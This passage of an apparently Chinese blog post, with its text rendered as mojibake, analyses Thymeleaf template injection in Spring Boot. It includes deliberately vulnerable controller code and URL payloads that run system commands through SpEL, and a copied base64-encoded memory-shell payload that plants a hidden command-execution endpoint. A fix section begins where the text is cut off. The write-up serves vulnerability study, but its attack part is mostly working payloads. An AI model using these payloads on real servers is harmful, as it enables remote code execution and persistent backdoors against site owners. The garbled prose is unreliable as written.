title="è·å–ModelAndViewè§†å›¾"></a>è·å–ModelAndViewè§†å›¾</h2><p>è·å–<code>ModelAndView</code>åï¼Œé€šè¿‡<code>DispatcherServlet#render</code>è·å–è§†å›¾è§£æå™¨å¹¶æ¸²æŸ“ï¼Œä¸­é—´çš„è¿‡ç¨‹å°±ä¸å†åˆ†æäº†ï¼Œå°±æ˜¯æ¯ç‡¥çš„è·Ÿç€èµ°è€Œå·²</p><p>ä¸è¿‡åˆ°è¿™é‡Œæµç¨‹ä¹Ÿå¾ˆç¬¦åˆå‰é¢æµç¨‹å›¾æ‰€æ€»ç»“çš„é‚£æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241213223643677.png" alt="image-20241213223643677"></p><p>resolveViewNameæ˜¯éå†è§†å›¾è§£æå™¨ç„¶åè¿”å›ä¸€ä¸ªï¼Œå…¶ä¸­é‡Œé¢æœ‰äº”ä¸ªè§†å›¾è§£æå™¨</p><p><img src="https://cdn.clown2024.cn/image-20241213224250552.png" alt="image-20241213224250552"></p><p>è¿™é‡Œè¿”å›çš„Viewæ˜¯ThymeleafView</p><p><img src="https://cdn.clown2024.cn/image-20241213224019290.png" alt="image-20241213224019290"></p><h2 id="è§†å›¾æ¸²æŸ“"><a href="#è§†å›¾æ¸²æŸ“" class="headerlink" title="è§†å›¾æ¸²æŸ“"></a>è§†å›¾æ¸²æŸ“</h2><p>æœ€åå°±æ˜¯è°ƒç”¨ThymeleafViewçš„renderå‡½æ•°è¿›è¡Œè§†å›¾æ¸²æŸ“</p><p><img src="https://cdn.clown2024.cn/image-20241213224451300.png" alt="image-20241213224451300"></p><p>åé¢çš„å…·ä½“æ¸²æŸ“åˆ†ææ¼æ´çš„æ—¶å€™å†è°ƒè¯•</p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><h2 id="templatenameæ¼æ´"><a href="#templatenameæ¼æ´" class="headerlink" title="templatenameæ¼æ´"></a>templatenameæ¼æ´</h2><p>ç»™å‡ºä¸€ä¸ªæ¼æ´ä»£ç çš„demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µæ˜¯ç›´æ¥å°†å‚æ•°æ‹¼æ¥åˆ°äº†æ¨¡æ¿è·¯å¾„ä¸­</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œå³ä½¿ä¸åŠ <code>.x</code>ä¾ç„¶å¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>ä¸€å¼€å§‹æˆ‘ç”¨çš„thymeleaf2.5.10ç‰ˆæœ¬æ‰“è¿™ä¸ªpayloadç»™æˆ‘æŠ¥äº†ä¸‹é¢çš„é”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªé”™è¯¯ä¿¡æ¯è¡¨æ˜åœ¨å¤„ç† Thymeleaf æ¨¡æ¿æ—¶ï¼Œè§†å›¾åç§°åŒ…å«äº†ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¹¶ä¸” URL è·¯å¾„æˆ–è¯·æ±‚å‚æ•°ä¸­ä¹ŸåŒ…å«äº†ä¸€ä¸ªè¡¨è¾¾å¼ã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒThymeleaf ä¸ºäº†é˜²æ­¢ç”¨æˆ·è¾“å…¥ç›´æ¥è¢«æ‰§è¡Œä¸ºè§†å›¾åç§°çš„ä¸€éƒ¨åˆ†ï¼Œç¦æ­¢äº†è¿™ç§æƒ…å†µã€‚</p><p>é‚£è¯´æ˜åé¢ç‰ˆæœ¬çš„ä¿®å¤æ˜¯é‡‡ç”¨äº†ç¦æ­¢è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œç„¶åçœ‹äº†ä¸€ä¸‹å…·ä½“çš„æŠ¥é”™ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20241213230550190.png" alt="image-20241213230550190"></p><p>æ˜¯thymeleaf-spring5-3.0.15.RELEASE.jarè¿™ä¸ªç‰ˆæœ¬çš„jaråŒ…ä¿®å¤äº†ï¼Œéœ€è¦å°†spring-boot-starter-parentçš„ç‰ˆæœ¬é™ä¸€ä¸‹ï¼Œé™æˆ2.4.1å°±è¡Œäº†ï¼Œç„¶åè¿™æ—¶å€™thymeleaf-springçš„ç‰ˆæœ¬æ˜¯3.0.11çš„ç‰ˆæœ¬</p><p><img src="https://cdn.clown2024.cn/image-20241213230754543.png" alt="image-20241213230754543"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…³é”®åœ¨å‰é¢æˆ‘ä»¬æ²¡åˆ†æçš„renderFragmentå‡½æ•°çš„æ¸²æŸ“è¿‡ç¨‹é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241213231629083.png" alt="image-20241213231629083"></p><p>é¦–å…ˆå¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬å¾—viewTemplateNameç»è¿‡æ‹¼æ¥ä¹‹åçš„å€¼ç°åœ¨æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::/welcome<br></code></pre></td></tr></table></figure><p>ç„¶åä»–ä¼šåˆ¤æ–­é‡Œé¢æ˜¯å¦æœ‰::å­—ç¬¦ä¸²ï¼Œè¿™ä»£è¡¨å…¶æ˜¯ä¸€ä¸ªç‰‡æ®µè¡¨è¾¾å¼</p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241213231941833.png" alt="image-20241213231941833"></p><p>ä¼šè·å–ä¸€ä¸ªè¡¨è¾¾å¼è§£æå™¨ï¼Œç„¶åè§£æè¡¨è¾¾å¼ï¼Œä¸”å°†æˆ‘ä»¬çš„viewTemplateNameç”¨~{å’Œ}åŒ…è£¹èµ·æ¥</p><p>ç„¶åè§¦å‘çš„è¿‡ç¨‹å°±åœ¨parseExpressionæ–¹æ³•é‡Œé¢ï¼Œä¸€ç›´å¾€åèµ°ä¼šèµ°åˆ°StandardExpressionPreprocessor#preprocessæ–¹æ³•å†…</p><p><img src="https://cdn.clown2024.cn/image-20241213233227916.png" alt="image-20241213233227916"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªæ­£åˆ™æå–å†…å®¹çš„åŒ¹é…å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241213233851249.png" alt="image-20241213233851249"></p><p>å…¶æ­£åˆ™åŒ¹é…æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\_\_(.*?)\_\_<br></code></pre></td></tr></table></figure><p>ä»£è¡¨å…¶åŒ¹é…__â€¦__ä¹‹é—´çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å°†æˆ‘ä»¬é‡Œé¢çš„è¡¨è¾¾å¼å†…å®¹åˆ†å‰²å‡ºæ¥äº†ï¼Œç»§ç»­å¾€ä¸‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241213234249011.png" alt="image-20241213234249011"></p><p>æœ€ç»ˆæ˜¯å°†æˆ‘ä»¬çš„è¡¨è¾¾å¼åˆ†å‰²å‡ºæ¥ï¼Œè·å¾—äº†ä¸€ä¸ªVariableExpressionï¼Œç„¶åæ‰§è¡Œå…¶executeå‡½æ•°æ‰§è¡Œè¡¨è¾¾å¼</p><p>ç„¶åå±‚å±‚è°ƒç”¨æœ€ç»ˆé€šè¿‡SPELæ¥æ‰§è¡Œè¡¨è¾¾å¼å†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241213234528330.png" alt="image-20241213234528330"></p><p>æ‰€ä»¥è¯¥æ¼æ´å®é™…ä¸Šå°±æ˜¯SPELè¡¨è¾¾å¼æ‰§è¡Œ</p><p>æ‰€ä»¥æ ¹æ®å‰é¢çš„åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“å¯ä»¥ä¸éœ€è¦.xï¼Œä½†æ˜¯ä¸‹é¢çš„æ¼æ´å½¢å¼ä¸€å®šéœ€è¦.x</p><h2 id="uri-path"><a href="#URI-PATH" class="headerlink" title="URI PATH"></a>URI PATH</h2><p>æ¼æ´ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>    <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ¼æ´åŸç†æ€»ç»“èµ·æ¥å°±æ˜¯å› ä¸ºModelAndViewè¿”å›å€¼ä¸ºç©ºï¼Œæ‰€ä»¥viewTemplateNameä¼šä»uriä¸­è·å–ï¼Œç›´æ¥åœ¨<code>&#123;document&#125;</code>ä½ç½®ä¼ å…¥payloadå³å¯</p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213235751753.png" alt="image-20241213235751753"></p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>æ¥å…·ä½“çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆæ²¡æœ‰è¿”å›ä¹Ÿä¼šèµ‹å€¼çš„åŸå› ï¼ŒåŸå› ä¸»è¦åœ¨<code>DispatcherServlet#doDispatch</code>ä¸­ï¼Œè·å–<code>ModleAndView</code>åè¿˜ä¼šæ‰§è¡Œ<code>applyDefaultViewName</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241214000125870.png" alt="image-20241214000125870"></p><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„mvé‡Œé¢éƒ½ä¸ºç©ºï¼Œç„¶åä¼šæ‰§è¡Œä¸€ä¸ªapplyDefaultViewNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214000313196.png" alt="image-20241214000313196"></p><p>é‡Œé¢ä¼šä»requestå¯¹è±¡é‡Œé¢è·å–ä¸€ä¸ªé»˜è®¤çš„ViewNameï¼Œè·å–åˆ°çš„defaultViewNameå°±æ˜¯æˆ‘ä»¬çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">doc/lang=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;).getInputStream()).next()&#125;__::<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æŠŠviewnameè®¾ç½®ä¸ºäº†æˆ‘ä»¬é»˜è®¤çš„è¿™ä¸ªViewName</p><p>æ¬¸ç„¶åè¿™é‡Œå‘ç°ï¼Œgetå›æ¥çš„ViewNameå·²ç»æŠŠæˆ‘ä»¬çš„.xå»æ‰äº†ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Œè¿›å»å…·ä½“çœ‹çœ‹éƒ½å‘ç”Ÿäº†ä»€ä¹ˆ</p><p>å…·ä½“æ˜¯é‡Œé¢çš„ä¸€ä¸ªtransformPathå‡½æ•°ï¼Œå¯¹è·¯ç”±è¿›è¡Œäº†æ ¼å¼è½¬åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241214001608987.png" alt="image-20241214001608987"></p><p>é¦–å…ˆå‰é¢ä¸¤éƒ¨åˆ†æ˜¯å»æ‰äº†å‰åçš„&#x2F;ï¼Œç„¶åè°ƒç”¨StringUtils.stripFilenameExtensionæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214001912868.png" alt="image-20241214001912868"></p><p>é‡Œé¢åˆ†åˆ«è·å–äº†æœ€åä¸€ä¸ª.çš„ç´¢å¼•å’Œæœ€åä¸€ä¸ª&#x2F;çš„ç´¢å¼•ï¼Œç„¶åæˆªå–åˆ°æœ€åä¸€ä¸ª.ç´¢å¼•çš„å†…å®¹</p><p>åˆ°è¿™é‡Œå°±æ˜ç™½æˆ‘ä»¬æœ€åä¸ºä»€ä¹ˆè¦åŠ ä¸€ä¸ª.xäº†å§ï¼Œå› ä¸ºéœ€è¦ä¿è¯æˆ‘ä»¬å‰é¢çš„payloadæ˜¯å®Œæ•´çš„ï¼Œæ‰€ä»¥å¾—åœ¨æœ€ååŠ ä¸€ä¸ª.ï¼Œå…¶å®ç»è¿‡åˆ†æåœ¨æœ€ååŠ ä¸ª.å°±å¯ä»¥äº†ï¼Œä¸ç”¨.x</p><p>åé¢çš„æµç¨‹å°±å’Œå‰é¢ä¸€æ ·äº†ï¼Œå°±ä¸åˆ†æäº†</p><blockquote><p>æ³¨æ„è¿™ä¸ªåªé€‚åˆæ— è¿”å›å€¼çš„æ—¶å€™ï¼Œä¸ç„¶viewå°±ä¼šè¢«è¿”å›å€¼ç»™å äº†</p></blockquote><h2 id="å›æ˜¾é—®é¢˜"><a href="#å›æ˜¾é—®é¢˜" class="headerlink" title="å›æ˜¾é—®é¢˜"></a>å›æ˜¾é—®é¢˜</h2><p>çœ‹æ–‡ç« ä»–ä»¬çš„å›æ˜¾å†…å®¹æ˜¾ç¤ºåœ¨äº†å‰ç«¯çš„æŠ¥é”™ä¿¡æ¯å†…éƒ¨ï¼Œåƒè¿™æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241214003633723.png" alt="image-20241214003633723"></p><p>è€Œæˆ‘çš„æ²¡æœ‰ï¼Œä»–åœ¨åå°çš„æ§åˆ¶å°çš„æŠ¥é”™å†…å®¹å€’æ˜¯æœ‰æ²¡ç»·ä½</p><p><img src="https://cdn.clown2024.cn/image-20241214003725080.png" alt="image-20241214003725080"></p><p>ç„¶åæœ‰å›æ˜¾çš„pocéœ€è¦::åé¢æ˜¯æœ‰å†…å®¹çš„ï¼Œå¤§è‡´åŸå› ä¸»è¦æ˜¯åœ¨<code>StandardExpressionParser#parseExpression</code>,åœ¨<code>preprocess</code>é¢„å¤„ç†ç»“æŸåè¿˜ä¼šé€šè¿‡<code>Expression.parse</code>è¿›è¡Œä¸€æ¬¡è§£æï¼Œè¿™é‡Œå¦‚æœè§£æå¤±è´¥åˆ™ä¸ä¼šå›æ˜¾ï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†</p><p>pocåœ¨::åé¢éšä¾¿åŠ ç‚¹å†…å®¹å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::aa.<br></code></pre></td></tr></table></figure><p>è‡³äºæˆ‘å‰æ®µä¸ºä»€ä¹ˆæ²¡å›æ˜¾æˆ‘å°±ä¸æƒ³çº ç»“äº†ï¼Œä¸å¦‚ç›´æ¥æ‰“å†…å­˜é©¬æ¥çš„æ–¹ä¾¿ï¼Œæœ‰å…³spelè¡¨è¾¾å¼æ³¨å…¥çš„å­¦ä¹ æ”¾ä¸‹ä¸€ç¯‡æ–‡ç« äº†ã€‚</p><h2 id="æ³¨å…¥å†…å­˜é©¬"><a href="#æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="æ³¨å…¥å†…å­˜é©¬"></a>æ³¨å…¥å†…å­˜é©¬</h2><p>è¿™é‡Œç›´æ¥copyæ–‡ç« çš„ä¸€ä¸ªå†…å­˜é©¬payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$&#123;T (org.springframework.cglib.core.ReflectUtils).defineClass(&quot;SpringRequestMappingMemshell&quot;,T (org.springframework.util.Base64Utils).decodeFromUrlSafeString(&quot;yv66vgAAADQAoQoACQBRCABSCgBTAFQIAFUKAFMAVgoACQBXCAAzBwBYBwBZBwBaCgAIAFsKAAoAXAcAXQgANQcAXgoACABfBwBgCABhCgARAGIHAGMHAGQKABQAZQcAZgoAFwBnCgANAFEKAAoAaAgAaQcAagoAHABrCABsCQBtAG4KAG8AcAcAcQoAcgBzCgAhAHQIAHUKACEAdgoAIQB3BwB4CQB5AHoKACcAewEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTFNwcmluZ1JlcXVlc3RNYXBwaW5nTWVtc2hlbGw7AQAIZG9JbmplY3QBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nOwEAD3JlZ2lzdGVyTWFwcGluZwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBABdtZXRob2RzUmVxdWVzdENvbmRpdGlvbgEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nAQASTGphdmEvbGFuZy9PYmplY3Q7AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAWQcAXgcAagEAEE1ldGhvZFBhcmFtZXRlcnMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAHwBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQHAH0MAH4AfwEACGNhbGMuZXhlDACAAIEMAIIAgwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QMAIQAhQwAhgCHAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcMAIgAhQEARm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAAIvKgwAKgCJAQBMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kDAAqAIoBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAAqAIsMAIwAjQEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAjgArAQAMaW5qZWN0LWVycm9yBwCPDACQAJEHAJIMAJMAlAEAEWphdmEvdXRpbC9TY2FubmVyBwCVDACWAJcMACoAmAEAAlxBDACZAJoMAJsAnAEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcAnQwAngCfDAAqAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEWdldERlY2xhcmVkTWV0aG9kAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAFcHJpbnQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACNvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1cwEAAk9LAQAlTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOwEAOihMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7KVYAIQANAAkAAAAAAAMAAQAqACsAAQAsAAAALwABAAEAAAAFKrcAAbEAAAACAC0AAAAGAAEAAAAMAC4AAAAMAAEAAAAFAC8AMAAAAAkAMQAyAAIALAAAAXEACQAHAAAApBICTLgAAxIEtgAFVyq2AAYSBwa9AAhZAxIJU1kEEglTWQUSClO2AAtNLAS2AAwSDRIOBL0ACFkDEg9TtgAQTrsAEVkEvQAPWQMSElO3ABM6BLsAFFkDvQAVtwAWOgW7ABdZGQQZBQEBAQEBtwAYOgYsKga9AAlZAxkGU1kEuwANWbcAGVNZBS1TtgAaVxIbTKcAEk0stgAdEh5MsgAfLLYAICuwAAEAAwCQAJMAHAADAC0AAABCABAAAAAOAAMAEAAMABEAKQASAC4AEwA_ABQAUQAVAF4AFgBwABcAjQAYAJAAHQCTABkAlAAaAJgAGwCbABwAogAeAC4AAABSAAgAKQBnADMANAACAD8AUQA1ADQAAwBRAD8ANgA3AAQAXgAyADgAOQAFAHAAIAA6ADsABgCUAA4APAA9AAIAAACkAD4APwAAAAMAoQBAAEEAAQBCAAAAEwAC_wCTAAIHAEMHAEQAAQcARQ4ARgAAAAUBAD4AAAABADUARwAEACwAAABoAAQAAwAAACa7ACFZuAADK7YABbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACMAGgAkAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBIAEEAAQAaAAwASQBBAAIASgAAAAQAAQBLAEYAAAAFAQBIAAAATAAAAAwBAAEATQABAE5zAEgAAQBPAAAAAgBQ&quot;),nEw javax.management.loading.MLet(NeW java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;,0).getBean(T (Class).forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;)))&#125;__::main.x<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—® <code>/asd?cmd=whoami</code> ã€‚</p><h2 id="å…¶ä»–å§¿åŠ¿"><a href="#å…¶ä»–å§¿åŠ¿" class="headerlink" title="å…¶ä»–å§¿åŠ¿"></a>å…¶ä»–å§¿åŠ¿</h2><p>${â€¦}æ”¹æˆ*{â€¦}ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><strong>çœç•¥__</strong></p><p>å½“Controllerå¦‚ä¸‹é…ç½®æ—¶ï¼Œå¯ä»¥çœç•¥<code>__</code>åŒ…è£¹ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦ç‰¹æ„å»åˆ†å‰²å­—ç¬¦ä¸²äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path2</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> lang; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h1><ol><li><p>é…ç½® <code>@ResponseBody</code> æˆ–è€… <code>@RestController</code>ï¼Œè¿™ä¸¤ä¸ªæ³¨è§£ä¸€å¼€å§‹ä¹Ÿæåˆ°è¿‡ï¼Œä»–ä»¬ä¼šå°†è¿”å›å€¼ä¼šè‡ªåŠ¨ä½œä¸ºHTTPå“åº”çš„æ­£æ–‡è¿”å›ï¼Œè¿™æ„å‘³ç€è¿”å›å€¼ä¸ä¼šè¢«è§†å›¾è§£æå™¨å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å†™å…¥HTTPå“åº”ä½“ä¸­ã€‚</p></li><li><p>åœ¨è¿”å›å€¼å‰é¢åŠ ä¸Š â€œredirect:â€</p><p>è¿™æ 